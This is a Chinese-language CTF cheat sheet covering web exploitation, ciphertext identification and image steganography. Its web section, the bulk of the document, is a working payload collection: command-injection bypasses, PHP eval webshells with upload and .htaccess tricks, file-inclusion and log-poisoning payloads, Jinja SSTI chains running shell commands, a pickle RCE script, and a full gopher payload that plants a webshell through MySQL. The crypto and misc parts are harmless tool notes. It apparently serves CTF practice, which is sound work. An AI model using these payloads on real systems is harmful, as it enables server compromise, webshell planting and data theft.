CTF Run
======

## Web
不能全信前端的代码提示

### HTTP

- HTTP 会将 URL 和 Headers 自动解 urldecode，但是不会解 POST 方法内的 urldecode

#### httpie

> Chrome 无法显示源码时，可直接用工具(如 httpie)请求接口

##### HTTP (GET / POST) 工具

```bash
# GET
http GET http:x?name=felord&age=18

# POST
http POST http:x name=felord age=18
```

#### 前端伪造 ip

X-Forwarded-For: 127.0.0.1

有时候网站多刷新几次会有不同的发现
        
注意观察网站刷新的原因是否由 Cookie 等字段影响的？

### Linux

#### ping 注入

注入
```bash
ping -c 4 127.0.0.1 | ls
```

& 注入
```bash
ping -c 4 127.0.0.1&ls
```

使用 base64 解码
```bash
ping -c 4 127.0.0.1&cat 7672134566268.php| base64
```

base 64 绕过复杂的正则表达式
```bash
http://xxx/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
# $IFS$ 是空格绕过
```

#### nmap 注入

```bash
-iL /flag -oN flag.txt
# 执行payload，将根目录下的flag文件内容作为扫描目标，并将扫描结果重定向到flag.txt文件中
```

#### 正则表达式工具
通过正则表达式来生成文本

https://onlinetexttools.com/generate-text-from-regex

正则表达式菜鸟工具

https://c.runoob.com/front-end/854/

### 端口扫描

#### nmap
> 端口扫描工具

### 文件
> 自己寻找文件时，要优先想到代码审计，查看 index.php 是什么内容

#### 目录扫描

##### dirsearch
> Web 目录扫描工具
```bash
# 用法：
python3 dirsearch.py -t 100 -u https://target
python3 dirsearch.py -t 100 --include-status 200-399 -u http://xxx
```

#### 文件注入

##### 中国蚁剑
```
PHP
1.编辑 PHP 文件内容:<?php eval(@$_POST['a']); ?>
2.将该文件上传到服务器(连接地址就是该文件路径，密码是上面输入的'a')
3.使用中国蚁剑连接该文件即可
```

#### Git

##### 手动抓取
> 实测抓取的记录比 scrabble 完整
```bash
wget -r http://xxx/.git
```
当 git log 找不到记录时，继续进行下面步骤

查看过去误操作改变的历史记录
```bash
git reflog
```
一个版本一个版本查看变动
```bash
git show xxx
```

##### GitHack
- 通过网站中泄漏的 .git 文件克隆出项目目录
- 需要 Python 2 环境

##### scrabble
> 查询网站泄漏的 .git 文件，并将本目录还原为网站目录
使用方法
```bash
git clone https://github.com/denny0223/scrabble.git
./scrabble http://example.com/​
```
> 在 M1 Mac 中，/Users/Cyberbolt/Library/CloudStorage/OneDrive-个人/编程/CTF/工具/Git工具/scrabble 保留了副本

#### Nginx

##### 目录穿越
穿越到上级目录 http://xxx/img../

### SQL 攻击

#### SQL 注入

##### sqlmap

###### GET
```bash
# 找到注入点，如 /?id=1
# 查数据库
python sqlmap.py -u http://x.com/?id=1 --dbs
# 查 N 数据库的表名
python sqlmap.py -u http://x.com/?id=1 -D N --tables
# 查 N 数据库的A 表的列名
python sqlmap.py -u http://x.com/?id=1 -D N -T A --columns
# 查 N 数据库的 A 表的 B 列数据
python sqlmap.py -u http://x.com/?id=1  -D N -T A -C B --dump
```

###### POST
```bash
# 发送 POST 请求
python sqlmap.py -u http://x.com --data="name=a&pass=123456aaa"
# 此处的 name 和 pass 都是 POST 方法的参数
```

##### 服务端文件读取
```bash
python sqlmap.py -u http://61.147.171.105:56766/join.ok.php --data="username=a&passwd=a&age=1&blog=baidu.com" --file-read "/var/www/html/flag.php"
# 重点是 --file-read 参数
```

##### 万能密码表
> 有时候 sqlmap 无法使用，该方法可以登录进去
```url
http://xxx/?username=admin'or'1'='1&password=123456'or'1'='1
```

#### SQL 约束攻击

##### 加一个空格，SQL 查询不会变
> 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。
```sql
SELECT * FROM users WHERE username='vampire     ';
```

### 代码注入

#### PHP

- index.php 的默认路径是 /var/www/html/index.php
- 看到类似 ?id=1 的 url，无论是不是一个正常页面，可以联想到注入
- 看清楚题目是 `$_GET` 还是 `$_POST` 。提交 POST 方法时注意看参数名写好了没有
- 当 system('ls'); 被绕过时，可以用 passthru("ls"); 代替。再提供一种思路，除了用 system 外，还可以直接 show_source('flag.php')、highlight_file('flag.txt')
- 当空格和 cat 被绕过，可以用 %09 替代空格，${IFS} 也可以用于替换空格。tac 替代 cat。
- %27%27 代表 '' 空字符串，可以绕过正则的 flag 匹配
- 如果 ; 被过滤，可以用 ?> 代替
- php 正则表达式后加一个 /i 表示大小写不敏感匹配
- 注意 include、eval、system 的区别。执行了代码记得加 ;
- 培养目录提权思维，如果一道题本身禁止访问 /flag.php，可以通过参数构造地址的方法 (类似 127.0.0.1/flag.php) 来访问。curl_setopt() 函数就类似 Python 的 requests，可以访问外部或内部地址
- SSRF
- - 如果 127.0.0.1 被过滤，可以使用 sudo.cc 替代。127.0.0.1 还可以写成 127.1    。http://0.0.0.0 可以写成 http://0
  - 如果网站使用无密码 MySQL、Redis，可以考虑用 Gopherus 实现 RCE 注入

##### 文件漏洞
- 在做题的时候尽量多试几个题目的提示后缀​（如 index.php、source.php）

###### 上传
> 拿到 webshell
>
> 需要注意下，有时候后端是通过 HTTP Headers 的 content-type 来判断文件类型的，改了 content-type 即可绕过。（在 Brup 中，只用改 ------WebKit 下方的 content-type）遇到过一道题，上传类型必须用 image/jpeg，用 jpg 和 png 都不行。
>
> 如果看不懂前端验证，可以改成图片格式后用 Burp 传上去，再用 Reapter 将文件后缀改为 PHP 传上去
>
> 如果 [] 被过滤了，可以用 {} 替代？？

**test.php**

- 1.编辑 PHP 文件内容:
```php
<?php eval(@$_POST['a']); ?>
```
- 2.将该文件上传到服务器(连接地址就是该文件路径，密码是上面输入的'a')
- 3.使用中国蚁剑连接该文件即可

(如果不成功，考虑绕过，试试 test.phtml 方法)【注意，有时候后端检测了文件中的内容，有 <? 就上传不了，可以考虑下面的方法 】

**test.phtml**

```html
<script language='php'>@eval($_POST['a']);</script>
```
**.htaccess 防止绕过 php**

如果服务端禁止上传 php，可以将 php 改为图片格式 (如 png) 欺骗服务器，再使用 .htaccess 将 png 指定为 php 文件执行。(需要注意下，传图片需要确保 HTTP Headers 的 content-type 为 image/jpeg，目前知道 .htaccess 支持 Nginx 和 Apache)

.htaccess 文件内容

```c
<FilesMatch "xin.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

 

###### 伪协议

**base64**

适用于 eval()、include()

```url
http://xxx/?p=php://filter/convert.base64-encode/resource=flag.php
```

- 更难的 (绕过 preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)))。**看到正则表达式绕过了 ; 就要联想到该方法，该方法的核心是 ?> 代替 ; ，表示接下来的语句是最后一条语句。

- ```
  http://xxx/?p=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
  # php语句中的;可以用?>代替(表示最后一个语句)
  
  # 通过使用 http://xxx/?c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php，我们可以看到这里传递给 c 变量的值是 include $_GET[1]，而 1 变量的值为 php://filter/convert.base64-encode/resource=flag.php。
  # 此时，include 语句将会加载 php://filter/convert.base64-encode/resource=flag.php 文件，并将其转换成 base64 编码形式后输出。由于此时 c 变量的值只是一个 include 语句，因此不会触发正则表达式中的任何敏感词匹配，从而成功绕过了安全措施。
  
  
  # 在此基础上，如果数字也被绕过，改为如下：
  http://xxx/?p=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
  # 这段命令正则表达式只能检测 include$_GET[a] 部分，后面的部分是传进来的
  
  # 继续 如果 < 和 > 被过滤了，再来一个无括号版的
  http://xxx/?p=include $_GET[a];&a=php://filter/read=convert.base64-encode/resource=flag.php
  ```

注释：使用 ?file=flag.php 读取文件可能会因为权限不足而无法读取到内容。因为有些 Web 服务器，如 Apache，会对目录或文件设置访问权限。如果当前用户没有足够的权限来读取 flag.php 文件，则无法读取到该文件的内容。而使用 ?file=php://filter/convert.base64-encode/resource=flag.php 可以绕过这些权限限制，因为 PHP 脚本本身具有读取文件的权限，它可以打开并读取任何一个它拥有的文件。通过将读取到的文件内容转换成 base64 编码后输出，即使该文件是二进制或包含特殊字符，也可以正确地输出文件内容，因此能够获取 flag。

**text/plain**

适用于 include()

```url
http://xxx/?p=data://text/plain,<?php system("ls");?>
```

然后，使用

```
http://xxx/?p=data://text/plain,<?php system('cat flag.php');?>
```

有时候还是被过滤了，就将 <?php system('cat flag.php');?> 转为 base64:

```
http://xxx/?p=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
# 当使用数据流协议 data:// 时，可以通过 base64 编码的方式来直接传递数据，而不需要引用外部文件
```

**执行 system**
方法一

```url
http://xxx/?page='.system("cat ./templates/flag.php").
```
方法一不行的话，用方法二
```url
?p=system('cat flag.php | base64')
```
原因：
在某些服务器上，执行 system('cat flag.php') 命令将会返回一个空字符串，而不是预期的 flag.php 文件内容。这是因为在 shell 中，管道符 | 表示将前一个命令的输出作为后一个命令的输入。由于执行 system() 函数时，标准输出通常不被捕捉，因此无法获取 cat flag.php 的输出，并且 $a 将被设置为空字符串。
相反，system('cat flag.php | base64') 命令将会将 flag.php 文件内容进行 base64 编码，然后将编码结果作为字符串返回。由于 base64 编码只使用 ASCII 字符集，可以保证其在 PHP 脚本中的可靠性，并且可以从 $a 中获取到正确的返回值。

另外的示例：

用 || 和 < 分别绕过 Linux 命令和空格。如果题目本来要执行一个 ping 或其他命令，可以这样绕过：

```
http://xxx/?c=tac<fla%27%27g.php||
# 只有当 || 左边的内容执行失败时，才会执行右边。%27%27 代表 '' 空字符串，可以绕过正则的 flag 匹配
# 等效于 ?c=tac<fla''g.php||    , Linux 在 tac 输出时会忽略 ''
```



**GET 方法注入字符串到文件流**
将字符串 hello ctf 注入文件流 file
```url
http://xxx/?file=data://text/plain,hello ctf
```

**POST 方法注入字符串到文件流**

适用于 file_get_contents()、include()

> POST 中，GET 方法的一个参数值是 php://input ，POST 中提交纯字符串可作为该参数的值（用于破解 PHP 读文件[如 file_get_contents]，此处可以自己构造文件内容）
>
> 如果小写 php 被绕过，可以用 Php://input
```
http"//xxx/?file=php://input
post data:<?php system("ls /"); ?>
# 此处的 POST 只传字符串(不是键值对)
```

**Nginx 日志文件，通过修改 User-Agent 执行 php 代码**

如果 php://input 都被过滤，可以考虑此方法

有时候题目代码没有明示，但测试下来 system() 等这些函数都用不了，则可以尝试该方法

例如

```
访问 http://xxx/?file=/var/log/nginx/access.log
修改 User-Agent 的值为 Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) <?php system('ls');?>Gecko/20100101 Firefox/56.0 
# 此处会执行中间插入的代码 <?php system('ls');?> 。（可能要访问2次才会显示，结果可能返回在 html 源码中）
```

**文件协议**

> 用于url是重定向的情况
```
http://xxx/?url=file:///var/www/html/flag.php
```

**include 函数的特性**
> 查找 ../../../../ffffllllaaaagggg 文件
```
http://xxx/source.php?file=hint.php?../../../../../ffffllllaaaagggg
```

###### SSI 漏洞
- 1.Web 服务器已支持SSI（服务器端包含）
- 2.Web 应用程序未对对相关SSI关键字做过滤
- 3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）

提交 POST
```
用户名 <!--#exec cmd="ls ../"-->
密码 123123 (输入正确密码)
```

##### 绕过复杂的正则表达式

> 查看 flag.php 的一种冷门方法

```
http://xxx/?p=uniq${IFS}f???.php
```

> 如 preg_match("/[A-Za-z0-9]+/",$code)

###### 取反执行某个函数
取反后 得到不可读的打印串，再将 url 编码
```php
<?php
$c='phpinfo';
$d=urlencode(~$c);
echo $d;
?>
# 返回：%8F%97%8F%96%91%99%90
```

访问 url

```
(~%8F%97%8F%96%91%99%90)();
```



###### 取反连接蚁剑

> 通过构建 assert（eval(_POST['test'])）来使蚁剑连接

```php
<?php
error_reporting(0);
$a='assert';
$b=urlencode(~$a);
echo '(~'.$b.')';
$c='(eval($_POST[1]))';
$d=urlencode(~$c);
echo '(~'.$d.')';
?>
# 得到 (~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6)
```
再访问 url
```
http://xxx/code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);
```

##### 执行系统命令

###### system('ls')

再提供一种思路，除了用 system 外，还可以直接 show_source('flag.php')

如果 system('cat flag.txt') 不成功，可以尝试如 system('cat f*.txt')。（或者可以尝试直接在浏览器访问这个文件）

##### 变量漏洞

###### 超级全局变量(输出所有全局变量的值)
```
http://xxx/?p=GLOBALS
```

##### 弱类型(==判断) 
> 知识点

**比较符**
- ===比较两个变量的值和类型；==比较两个变量的值，不比较数据类型。
- 在php中,如果bool和"任何其他类型"比较,"任何其他类型"会转换为bool。
- 看到类似 if(intval($num)) 要联想到弱类型，通过数组绕过。（数组同时可以绕过正则表达式）
- 447.0 和 447 用 === 比较的时候不相等
###### MD5 绕过
举例（以下几个字符串可绕过弱类型 md5）
```
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
```
如果前一种方法不行，利用 md5 无法处理数组的特性绕过。(sha1 也无法处理数组类型，也适用此方法)
```
http://xxx/?v1[]=1&v2[]=2
```

###### 弱类型 if 绕过
下面的代码示例结果输出 1
```php
<?php 
$x=5;
$y="5s";
if ($x == $y) {
    echo 1;
}
?>
```

###### if(!$_GET['id']) 绕过
某个 GET 参数例如 id 的值为 0，在 PHP 中，!$_GET['id'] 该判断是 true。要绕过该判断，使用 id=0a 即可
>”1aaaa“=="1"是成立的，因为数字和字母不可比较，只要字母前面的数字全一样就可以
>
>但是，如果是 "aaaa1"=="1" 就不成立，字母在前时，会被识别为非数值类型，返回 0

举例
```
if(!$_GET['id']) 是弱比较
if($_GET['id'] === null) 是强比较
```

###### SQL 注入的弱类型绕过

```
http://xxx/?id=2 or id =1000
# 用于绕过弱类型比较时，id 只能小于 1000 的情况

# 继续 如果 or 也被绕过，使用 ||
http://xxx/?id=2||id=1000
或者 取反
http://xxx/?id=~~1000
# 取反操作时，intval('~~1000') 会将值转为 0，所以可以绕过 if(intval($id) > 999)
```

继续上面的类型，如果连取反 ~ 也被绕过，则用以下脚本转为二进制解题

```python
def main():
    a = 1000
    print(bin(a))
    

if __name__ == '__main__':
    main()
    

# # 获取用户输入十进制数
# dec = int(input("输入数字："))
 
# print("十进制数为：", dec)
# print("转换为二进制为：", bin(dec))
# print("转换为八进制为：", oct(dec))
# print("转换为十六进制为：", hex(dec))
```

得到以下 url

```
http://xxx/?id=0b1111101000
# 0b1111101000 是 1000 的二进制
# 说明数据库会自动将二进制转为十进制？
```

##### 反序列化

> PHP 的反序列化和 Python 有很大区别。PHP 中只能根据原本模版 (class) 来改，只能改变属性值，不能修改方法 (只能修改构造方法)。PHP 的序列化更像是在前端构建和后端相匹配的数据结构。
>
> 反序列化也支持反序列化字符串。
>
> PHP 中类属性只能是 字符串、数值或 bool，只能在外部用 -> 指向其他类型（如函数）
>
> w00m->{a}: 表示调用 w00m 对象的 a 方法，a 是方法名的字符串

反序列化代码示例

```php
<?php
class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=true;
}

$ctfs = new ctfShowUser();
echo urlencode(serialize($ctfs));
?>

// 最后输出时最好使用 urlencode 编码，避免不合规字符串，Cookie 中的 url 编码会被 HTTP 自动解码
```

##### Gopher 注入 RCE 漏洞

- 核心是后台可以请求 url 链接，在这里使用 Gopher 注入代码
- 已经安装在 pt-ctf 的 Docker 容器中

###### 打无密码 MySQL

```bash
gopherus --exploit mysql
```

输入 username 为 root

输入 execute 为

```sql
select "<?php @eval($_POST['test']);?>" into outfile '/var/www/html/2.php';
```

得到

```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4c%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%74%65%73%74%27%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01
```

由于有不允许的字段，用 url 编码后面的内容得到

```
gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%2574%2565%2573%2574%2527%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2532%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501
```

通过 Brup 的 Reapter 将 这段内容注入到服务器后端请求 url 的位置，即可正常使用蚁剑连接

###### 打 Redis

```bash
gopherus --exploit redis
```

根据提示输入即可，和上面的打 MySQL 差不多，其中我选的 phpshell，没有选反弹 shell，只是 PHP 注入内容输入

```php
<?php @eval($_POST['test']);?>
```

 然后通过默认生成的 shell.php 实现蚁剑连接

###### 备忘 GitHub 的示例

- MySQL：如果用户没有密码保护，你可以转储他的数据库，也可以在他的系统中放置恶意文件。

```
gopherus --exploit mysql
```

   它只询问 MySQL 用户的用户名，它会为您提供 gopher 链接。

- PostgreSQL：如果用户没有密码保护，你可以转储他的数据库，也可以将恶意文件放入他的系统。

```
gopherus --exploit postgresql
```

   它只询问 Postgres 用户的用户名和数据库名称，然后它会为您提供 gopher 链接。

- FastCGI：如果端口 9000 在没有安全保护的情况下打开，那么您可以获得 RCE。

```
gopherus --exploit fastcgi
```

   它只要求一个必须存在于受害者系统中的文件（最好是 .php 文件），顺便说一句，我们有默认文件。

- Redis：如果redis端口是开放的，那么我们可以覆盖系统中的文件，这太危险了。
  所以这里有两件事你可以得到：
  a。反向 Shell
  b. PHP外壳

```
gopherus --exploit redis
```

- Zabbix：如果端口 10050 处于打开状态，`EnableRemoteCommands = 1`那么您可以在受害系统上运行 shell 命令。

```
gopherus --exploit zabbix
```

- Memcached：它主要用于存储序列化数据，但是当涉及到对这些数据进行反序列化时，就会出现已知的漏洞，例如 PHP 反序列化问题、Python-Pickle 反序列化问题、Ruby-Marshal 反序列化问题这可能导致 RCE。
  因此，我为它们中的每一个创建了不同的脚本，还创建了一个用于转储 Memcached 内容的脚本：

```
gopherus --exploit pymemcache
gopherus --exploit rbmemcache
gopherus --exploit phpmemcache
gopherus --exploit dmpmemcache
```

- SMTP：如果端口 25 是开放的，那么我们可以访问它，我们可以作为受害者用户向任何人发送消息，所以这个工具会生成用于发送邮件的 gopher payload。

```
gopherus --exploit smtp
```



##### 特殊函数的漏洞

###### strcmp
> 不支持数组，遇到数组会直接返回0
```
?id[]=1
```

##### 函数备忘

###### curl_setopt()

curl_setopt() 函数就类似 Python 的 requests，可以访问外部或内部地址。可以用它来构造 127.0.0.1 访问原本访问不到的路径

###### parse_url($url)

parse_url($url) 会把 url 解析为 http、host、port、user、pass、path 等部分

###### filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE))

只要 ip 里面有本机地址 (如 127.0.0.1、0.0.0.0) ，全部过滤



#### tplmap

> Python 注入(PHP 也有 SSTI)

##### 路径注入
- 注入某个 URL 路径
```bash
./tplmap.py -u http://xxx/*
# 此处 * 为注入的变量
```
- 拿到 shell
```bash
./tplmap.py -u http://xxx/* --os-shell
```
##### GET 注入
```bash
./tplmap.py -u http://xxx/?a=1
# GET 方法参数为 a
```
##### POST 注入
参数 --data
```bash
./tplmap.py -u http://xxx/ --data='"name=a&pass=*"'
```


#### Python

##### 模板注入
建议根据下面一点一点试
```
http://xxx/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
```

##### 执行系统命令

建议根据下面一点一点试（下面的示例层层递进？）

```
http://xxx/?name={{"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()}}

# 如果被过滤了 2、3 等数字，用下面这个
http://xxx/?name={{().__class__.__mro__[1].__subclasses__()[407]("cat /flag",shell=True,stdout=-1).communicate()[0]}}

# 在上面的基础上，又被过滤单、双引号
http://xxx/?name={{().__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]}}&a=cat /flag

# 继续被过滤 args
http://xxx/?name={{().__class__.__mro__[1].__subclasses__()[407](request.values.a,shell=True,stdout=-1).communicate()[0]}}&a=cat /flag

# 继续 过滤了方括号，可以用__getitem__绕过
http://xxx/?name={{().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)}}&a=cat /flag

# 继续，过滤了下划线_
http://xxx/?name={{(lipsum | attr(request.values.b)).os.popen(request.values.a).read()}}&a=cat /flag&b=__globals__

# 继续 过滤了os，可以通过get来获取
http://xxx/?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=cat /flag

# 继续 过滤了request，但是是再{{}}中过滤了request，没有在{% %}过滤request
http://xxx/?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&a=__globals__&b=os&c=cat /flag
```

在上面的基础上，基本啥都被绕过了

```
http://xxx/?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%}
{%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%}
{%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%}
{%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%}
{%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%}
{%set oo=dict(o=a,s=a)|join%}
{%set pp=dict(po=a,pen=a)|join%}
{%set space=chcr(32)%}
{%set xiegang=chcr(47)%}
{%set shell=(dict(cat=a)|join,space,xiegang,dict(flag=a)|join)|join%}
{%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%}
```



##### Unserializer Pickle

示例
```python
import base64
import pickle

import httpx


class A:
    def __reduce__(self):
        import subprocess
        s = '''
import subprocess

r = subprocess.run(
    'cat flag', # 此处可修改命令
    shell=True,
    check=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT
)
print(r.stdout.decode())
        '''
        return (subprocess.check_output, (["python3","-c",s],))


a = A()
data = {
    'payload': base64.b64encode(pickle.dumps(a)).decode()
}
a = base64.b64decode(data['payload'])
r = httpx.put('http://114.67.175.224:14014/flag', json=data)
print(f'r:{r.text}')
```

## Crypto

### 密文解码

#### ciphey
> 先尝试 ciphey -t "Encrypted input"

另外，如果能看出密钥，这种可能使用 AES 算法

#### base 格式
> 看到很长一串，可能是图片的 base64

**basetrack**

**普通解码**
```bash
python3 basecrack.py -b 编码文本
```

**自动解码**

```bash
python basecrack.py --magic -b 编码文本
```

**base64 转图片**

```bash
https://tool.jisuapi.com/base642pic.html
```

#### 带前缀的 MD5 碰撞

运行以下脚本，解得后缀

```python
import hashlib # 建立爆破的字典data 


def main():
    prefix = 'ctfshow' # 自定义前缀
    
    data='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+-*/' # 从一个字符开始尝试，逐渐往下加 
    for i in data: 
        for j in data : 
            for k in data: 
                s = hashlib.md5((prefix+i+j+k).encode()).hexdigest() 
                if s == 'a6f57ae38a22448c2f07f3f95f49c84e':#判断值是否符合条件 
                    print(i + j + k) # 输出字符c的值 脚本输出36d 构造payload: ?c=36d 


if __name__ == '__main__':
    main()
```



#### TomatoTools 来识别编码

##### 问题
- 软件的 base58 有问题
- Brainfuck 有问题

#### 肉眼识别密文类型

##### 摩斯电码

形如

```
-- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -- -- -.. -.. -- -.. -- -.. -- -- -- -.. -.. -.. /-- -.. -- -.. -.. --/ -- -- -- -- -- /-- -.. -.. -- -.. -- /-- -.. -.. -- 
```

如果工具解不开，直接用 ciphey 解就行了（自动去斜杠）

##### 栅栏密码

形如

```
(不是标准格式) fg2ivyo}l{2s3_o@aw__rcl@

再来一个 KYdf0a3ebd5c4dc160-E{fb63ee0298b8f4d8}
```



##### 培根密码

解密地址 http://www.metools.info/code/bacon193.html

形如 

```
AABBBABBA
```



如果遇到类似培根密码的形式，如 MMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM ，需要转为 AB 形式，快捷脚本:

```python
data = {
    'M': 'A',
    'D': 'B'
}

text = ''
for i in 'MMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM':
    text+= data[i]
    
print(text)
```



##### 社会主义核心价值观加密/解密
形如 

```
公正公正公正诚信文明公正民主公正法治法治友善平等和谐敬业和谐富强和谐富强和谐文明和谐平等公正公正和谐法治公正公正公正文明和谐民主和谐敬业和谐平等和谐敬业和谐敬业和谐和谐和谐公正法治友善法治
```



##### ook
形如

```
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
```

解密地址 https://www.splitbrain.org/services/ook

##### 猪圈密码

形如下图

![](./img/猪圈密码.png)

解密地址 http://www.metools.info/code/c90.html

##### Baudot Code

形如

```
11001 00011 00111 01001 11011  10110 11111  10000 01110 11011  10110 11111  01001 00001
```

解密地址 https://www.boxentriq.com/code-breaking/baudot-code

##### html 的编码样子
形如

```
&#x66;&#x6c;&#x61;
```




### 密码学及文本处理工具

#### 编码任何类型的数据
> 任何类型的文件都可能被编码，可尝试用 stegpy 解编码

##### stegpy
普通提取
```bash
stegpy _image.png
```
带密码提取
```bash
stegpy _image.png -p 密码
```

#### Hash 类密文在线解密
https://www.cmd5.com/

上面的地址有时候要收费，下面这个是免费的

https://www.somd5.com/

#### 密码字典生成

##### crunch
> 生成该数字开头的所有手机号
```bash
crunch 11 11 -t 1391040%%%% -o 1.txt
```

##### 大小写转换
https://www.iamwawa.cn/daxiaoxie.html

## Misc

- 脑洞：
- - 不排除 Misc 的 flag 是中文的情况，比如图片中隐藏了几个模糊的汉字。（有时候缩小了看得更清楚？）
  - 解到离 flag 最近的一步，{} 中是大写数字，把大写数字转为正规数字即可得到 flag
- macOS 的坑：
- - 遇到过一次解压输入密码后解压不了，这时换一个解压软件即可
  - 使用 hex friend 复制出来的文本格式有时候有问题（Mac 上肉眼看不见，用剪切板或粘贴在终端即可发现），这时 OCR 一次。

### 图片类型

- bitmap 格式的文件后缀是 bmp，TIFF 格式的后缀是 tif (这些类图片格式可以考虑直接改成 jpg 打开)

#### 二维码、条码识别
https://online-barcode-reader.inliteresearch.com/

有时候扫了二维码不一定能拿到 flag，遇到一道题，将 flag 藏在了 URL 的路径处，解开 base64 即可拿到 flag

#### 查看 hex 中有无线索
html 的编码样子

类似 &#x66;&#x6c;&#x61;

使用 hex friend 复制出来的文本格式有时候有问题（Mac 上肉眼看不见，用剪切板或粘贴在终端即可发现），OCR 一次。

#### 图片属性里有可能藏有东西

> macOS 像 Windows 一样查看图片的备注
```bash
exiftool -verbose 1.jpg
# 其中输出内容的 XPComment 就是图片备注
```

#### 图片取征 Stegsolve

##### LSB
在 Stegsolve-Analyse-Data Extract 勾上右下角3个0，点 preview

##### 可能是图片宽高被修改了
- 1.可以在 Stegsolve-Analyse-File format 最上面查看图片的原始宽高
- 2.使用自动破解宽高的程序恢复(Python 脚本)

##### 合并多张图
如果有多张图，可以用 Stegsolve 合并(Image Combiner)

#### 另一种图片隐写解法 zsteg
> 主要用来检测 png 和 bpm (主要用于 LSB ?)
```bash
zsteg -a file
```

#### jphs

